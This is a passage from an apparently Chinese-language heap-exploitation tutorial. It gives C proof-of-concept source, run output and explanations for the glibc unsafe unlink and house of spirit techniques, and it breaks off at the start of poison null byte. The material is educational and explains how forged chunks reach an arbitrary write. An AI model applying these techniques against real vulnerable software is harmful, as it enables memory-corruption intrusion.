</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Original value: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=n>victim_string</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>chunk0_ptr</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x4141414142424242LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;New Value: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=n>victim_string</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>输出：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Welcome to unsafe unlink 2.0!
</span></span><span class=line><span class=cl>Tested in Ubuntu 14.04/16.04 64bit.
</span></span><span class=line><span class=cl>This technique can be used when you have a pointer at a known location to a region you can call unlink on.
</span></span><span class=line><span class=cl>The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.
</span></span><span class=line><span class=cl>The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>The global chunk0_ptr is at 0x602070, pointing to 0x23ed010
</span></span><span class=line><span class=cl>The victim chunk we are going to corrupt is at 0x23ed0a0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>We create a fake chunk inside chunk0.
</span></span><span class=line><span class=cl>We setup the &#39;next_free_chunk&#39; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.
</span></span><span class=line><span class=cl>We setup the &#39;previous_free_chunk&#39; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.
</span></span><span class=line><span class=cl>With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False
</span></span><span class=line><span class=cl>Fake chunk fd: 0x602058
</span></span><span class=line><span class=cl>Fake chunk bk: 0x602060
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.
</span></span><span class=line><span class=cl>We shrink the size of chunk0 (saved as&#39;previous_size&#39;in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.
</span></span><span class=line><span class=cl>It&#39;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly
</span></span><span class=line><span class=cl>If we had &#39;normally&#39; freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: 0x80
</span></span><span class=line><span class=cl>We mark our fake chunk as free by setting &#39;previous_in_use&#39; of chunk1 as False.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.
</span></span><span class=line><span class=cl>You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.
</span></span><span class=line><span class=cl>chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.
</span></span><span class=line><span class=cl>Original value: Hello!~
</span></span><span class=line><span class=cl>New Value: BBBBAAAA
</span></span></code></pre></td></tr></table></div></div><p>利用 unlink 漏洞一般需要堆溢出以及全局指针变量。在这个例子里全局指针变量就是 <code>chunk0</code> 的 mem 指针，<code>chunk0</code> 中存在堆溢出，可以溢出到 <code>chunk1</code>。</p><p>我们首先看一下 <code>unlink</code> 这个宏，它被用来从 bin 中删除 chunk：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#define unlink(AV, P, BK, FD) {                                            \
</span></span></span><span class=line><span class=cl><span class=cp>    FD = P-&gt;fd;                                                               \
</span></span></span><span class=line><span class=cl><span class=cp>    BK = P-&gt;bk;                                                               \
</span></span></span><span class=line><span class=cl><span class=cp>    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                     \
</span></span></span><span class=line><span class=cl><span class=cp>      malloc_printerr (check_action,&#34;corrupted double-linked list&#34;, P, AV);  \
</span></span></span><span class=line><span class=cl><span class=cp>    else {                                                                    \
</span></span></span><span class=line><span class=cl><span class=cp>        FD-&gt;bk = BK;                                                          \
</span></span></span><span class=line><span class=cl><span class=cp>        BK-&gt;fd = FD;                                                          \
</span></span></span><span class=line><span class=cl><span class=cp>        if (!in_smallbin_range (P-&gt;size)                                      \
</span></span></span><span class=line><span class=cl><span class=cp>            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) {                \
</span></span></span><span class=line><span class=cl><span class=cp>            if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)        \
</span></span></span><span class=line><span class=cl><span class=cp>                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \
</span></span></span><span class=line><span class=cl><span class=cp>              malloc_printerr (check_action,                                  \
</span></span></span><span class=line><span class=cl><span class=cp>                               &#34;corrupted double-linked list (not small)&#34;,    \
</span></span></span><span class=line><span class=cl><span class=cp>                               P, AV);                                        \
</span></span></span><span class=line><span class=cl><span class=cp>            if (FD-&gt;fd_nextsize == NULL) {                                    \
</span></span></span><span class=line><span class=cl><span class=cp>                if (P-&gt;fd_nextsize == P)                                      \
</span></span></span><span class=line><span class=cl><span class=cp>                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;                     \
</span></span></span><span class=line><span class=cl><span class=cp>                else {                                                        \
</span></span></span><span class=line><span class=cl><span class=cp>                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                         \
</span></span></span><span class=line><span class=cl><span class=cp>                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                         \
</span></span></span><span class=line><span class=cl><span class=cp>                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                         \
</span></span></span><span class=line><span class=cl><span class=cp>                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                         \
</span></span></span><span class=line><span class=cl><span class=cp>                  }                                                           \
</span></span></span><span class=line><span class=cl><span class=cp>              } else {                                                        \
</span></span></span><span class=line><span class=cl><span class=cp>                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;                 \
</span></span></span><span class=line><span class=cl><span class=cp>                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;                 \
</span></span></span><span class=line><span class=cl><span class=cp>              }                                                               \
</span></span></span><span class=line><span class=cl><span class=cp>          }                                                                   \
</span></span></span><span class=line><span class=cl><span class=cp>      }                                                                       \
</span></span></span><span class=line><span class=cl><span class=cp>}
</span></span></span></code></pre></td></tr></table></div></div><p>可以先忽略下面和 large bin 相关的部分，关注开头：首先要求满足两个条件：</p><ul><li><code>(P->fd)->bk == P</code></li><li><code>(P->bk)->fd == P</code></li></ul><p>如果满足，则执行：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>(P-&gt;fd)-&gt;bk = P-&gt;bk
</span></span><span class=line><span class=cl>(P-&gt;bk)-&gt;fd = P-&gt;fd
</span></span></code></pre></td></tr></table></div></div><p>这就是普通的双向链表删除结点的操作，不安全的地方在于上面的检查，我们可以伪造堆块来绕过这个检查。</p><p>我们在 chunk0 里伪造 chunk。对于 <code>chunk0_ptr</code>，我们预留 <code>0x10</code> 空间给伪 chunk 的 <code>prev_size</code> 和 <code>chunk_size</code> 字段，此时 <code>chunk0_ptr</code> 就是 <code>fake_chunk</code> 的 chunk 指针。那么其 <code>fd</code> 实际上就是 <code>*(chunk0_ptr + 2)</code>，其 <code>bk</code> 实际上就是 <code>*(chunk0_ptr + 3)</code>。用 <code>_0</code> 后缀表示属于 chunk0 的字段，<code>_f</code> 表示属于伪造 chunk 的字段（从左至右、从下至上为低地址到高地址）：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl> ---------------------------- &lt;- chunk1_ptr
</span></span><span class=line><span class=cl>| prev_size_1 | chunk_size_1 |
</span></span><span class=line><span class=cl> ----------------------------
</span></span><span class=line><span class=cl>| data                       |
</span></span><span class=line><span class=cl> ----------------------------
</span></span><span class=line><span class=cl>| fd_f        | bk_f         |
</span></span><span class=line><span class=cl> ----------------------------
</span></span><span class=line><span class=cl>| prev_size_f | chunk_size_f |
</span></span><span class=line><span class=cl> ---------------------------- &lt;- chunk0_ptr
</span></span><span class=line><span class=cl>| prev_size_0 | chunk_size_0 |
</span></span><span class=line><span class=cl> ----------------------------
</span></span></code></pre></td></tr></table></div></div><p>如果我们让伪造的 <code>fd</code> 指向 <code>&chunk0_ptr - 0x18</code>（<code>0x8</code> 一个单位，即三个单位），那么要找到 <code>(fake_chunk->fd)->bk</code>，就需要计算 <code>(&chunk0_ptr - 0x18) + 0x18 = &chunk0_ptr</code>，这就回到了 <code>fake_chunk</code> 的 chunk 指针上，满足了第一个条件。</p><p>同理，让伪造的 <code>bk</code> 指向 <code>&chunk0_ptr - 0x10</code>，那么它的 <code>fd</code> 就需要把 <code>0x10</code> 加回来，同样回到了 <code>fake_chunk</code> 的 chunk 指针。这样就绕过了 unlink 的检查。</p><p>现在，由于存在堆溢出，我们将 <code>chunk1</code> 的 <code>prev_size</code> 写成我们 <code>fake_chunk</code> 的大小。在例子里 <code>chunk0</code> 大小为 0x90，而 <code>fake_chunk</code> 为 0x80。然后把 <code>chunk1</code> 的 <code>PREV_IN_USE</code> 位置为 0，这样以后再 <code>free(chunk1)</code>，此时分配器就会认为前面有一个空闲的大小为 0x80 的 chunk，也就是我们的 <code>fake chunk</code>，然后触发 <code>unlink(fake_chunk)</code> 来尝试与 <code>chunk1</code> 合并。</p><p>问题在于，我们从头到尾都没有真正释放过 <code>fake chunk</code>，因此它不可能出现在任何 bin 里，而 <code>unlink</code> 却尝试把它从 bin 里拆出来。这时执行链表删除操作，但由于 <code>(P->fd)->bk</code> 和 <code>(P->bk)->fd</code> 是相同的，只有后一句有意义，此时相当于执行了 <code>chunk0_ptr = &chunk0_ptr - 0x18</code>。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl> ------------------
</span></span><span class=line><span class=cl>| &amp;chunk0_ptr-0x18 |---
</span></span><span class=line><span class=cl> ------------------    |
</span></span><span class=line><span class=cl>| ?                |   |
</span></span><span class=line><span class=cl> ------------------    |
</span></span><span class=line><span class=cl>| ?                |   |
</span></span><span class=line><span class=cl> ------------------ &lt;---
</span></span><span class=line><span class=cl>| ?                |
</span></span><span class=line><span class=cl> ------------------
</span></span></code></pre></td></tr></table></div></div><p>那么同理，如果我们修改 <code>*(chunk0_ptr + 3)</code> 的值为 <code>Hello!~</code>，实际上就等于令 <code>chunk0_ptr</code> 指向 <code>Hello!~</code>，此时修改 <code>*chunk0_ptr</code>，那么 <code>Hello!~</code> 字符串就被覆盖了。</p><h2 id=house_of_spirit>house_of_spirit</h2><p>源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This file demonstrates the house of spirit attack.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Calling malloc() once so that it sets up its memory.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>malloc</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We will now overwrite a pointer to point to a fake &#39;fastbin&#39; region.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>long</span> <span class=o>*</span><span class=n>a</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=c1>// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>long</span> <span class=n>fake_chunks</span><span class=p>[</span><span class=mi>10</span><span class=p>]</span> <span class=n>__attribute__</span> <span class=p>((</span><span class=n>aligned</span> <span class=p>(</span><span class=mi>16</span><span class=p>)));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>fake_chunks</span><span class=p>),</span> <span class=o>&amp;</span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=o>&amp;</span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>9</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. </span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fake_chunks</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x40</span><span class=p>;</span> <span class=c1>// this is the size
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;The chunk.size of the *next* fake region has to be sane. That is&gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt;av-&gt;system_mem (&lt;128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=n>fake_chunks</span><span class=p>[</span><span class=mi>9</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x1234</span><span class=p>;</span> <span class=c1>// nextsize
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>a</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>2</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Freeing the overwritten pointer.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>free</span><span class=p>(</span><span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now the next malloc will return the region of our fake chunk at %p, which will be %p!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=o>&amp;</span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>2</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;malloc(0x30): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x30</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>输出：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>This file demonstrates the house of spirit attack.
</span></span><span class=line><span class=cl>Calling malloc() once so that it sets up its memory.
</span></span><span class=line><span class=cl>We will now overwrite a pointer to point to a fake &#39;fastbin&#39; region.
</span></span><span class=line><span class=cl>This region (memory of length: 80) contains two chunks. The first starts at 0x7ffcdc8eeb88 and the second at 0x7ffcdc8eebc8.
</span></span><span class=line><span class=cl>This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.
</span></span><span class=line><span class=cl>... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.
</span></span><span class=line><span class=cl>The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt;av-&gt;system_mem (&lt;128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.
</span></span><span class=line><span class=cl>Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffcdc8eeb88.
</span></span><span class=line><span class=cl>... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.
</span></span><span class=line><span class=cl>Freeing the overwritten pointer.
</span></span><span class=line><span class=cl>Now the next malloc will return the region of our fake chunk at 0x7ffcdc8eeb88, which will be 0x7ffcdc8eeb90!
</span></span><span class=line><span class=cl>malloc(0x30): 0x7ffcdc8eeb90
</span></span></code></pre></td></tr></table></div></div><p>这个比较简单，在 <code>fake_chunks</code> 数组里伪造了 fastbin 大小的 chunk，确保当前 <code>chunk_size</code> 和 <code>nextsize</code> 合法后，把 fake chunk 的 mem 指针地址给指针 <code>a</code>，然后 <code>free(a)</code>，这样就使得 fake chunk 进入了 fastbin，下次 <code>malloc</code> 就会返回这个 mem 指针。</p><p>这里的合法是指：</p><ul><li><code>chunk_size</code> 的 <code>IS_MMAPED</code> 为 0</li><li><code>chunk_size</code> 属于 fastbin 范围内</li><li><code>nextsize</code> 大于 <code>2*SIZE_SZ</code>，小于 <code>system_mem</code></li></ul><h2 id=poison_null_byte>poison_null_byte</h2><p>源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;malloc.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Welcome to poison null byte 2.0!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Tested in Ubuntu 14.04 64bit.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This technique can be used when you have an off-by-one into a malloc&#39;ed region with a null byte.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=kt>uint8_t</span><span class=o>*</span> <span class=n>a</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>uint8_t</span><span class=o>*</span> <span class=n>b</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>uint8_t</span><span class=o>*</span> <span class=n>c</span><span class=p>;</span>
